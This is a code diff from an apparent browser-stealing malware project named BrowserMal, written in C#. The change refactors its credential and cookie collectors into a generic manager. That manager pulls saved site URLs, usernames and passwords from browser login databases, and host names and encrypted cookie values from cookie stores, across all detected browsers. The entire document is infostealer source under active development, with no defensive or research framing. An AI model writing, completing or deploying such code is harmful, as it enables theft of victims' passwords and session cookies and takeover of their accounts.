@@ -2,6 +2,7 @@
 using BrowserMal.Credential;
 using BrowserMal.Cookie;
 using System.Collections.Generic;
+using BrowserMal.Manager;
 
 namespace BrowserMal
 {
@@ -10,16 +11,17 @@ namespace BrowserMal
         //private static string COOKIES_DATA_PATH = "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies";
 
         private static readonly BrowserManager browserManager = new BrowserManager();
-        private static readonly CredentialManager credentialManager = new CredentialManager();
-        private static readonly CookieManager cookieManager = new Cookie.CookieManager();
 
         public static void Start()
         {
             browserManager.Init();
             List<BrowserModel> browsers = browserManager.GetBrowsers();
 
-            credentialManager.Init(ref browsers);
-            cookieManager.Init(ref browsers);
+            GenericManager<CredentialModel> credentialManager = new GenericManager<CredentialModel>("logins", new string[] { "origin_url", "username_value", "password_value" });
+            credentialManager.Init(ref browsers, Browser.Util.LOGIN_DATA);
+
+            GenericManager<CookieModel> cookiesManager = new GenericManager<CookieModel>("cookies", new string[] { "host_key", "name", "encrypted_value" });
+            cookiesManager.Init(ref browsers, Browser.Util.COOKIES);
         }
     }
 }
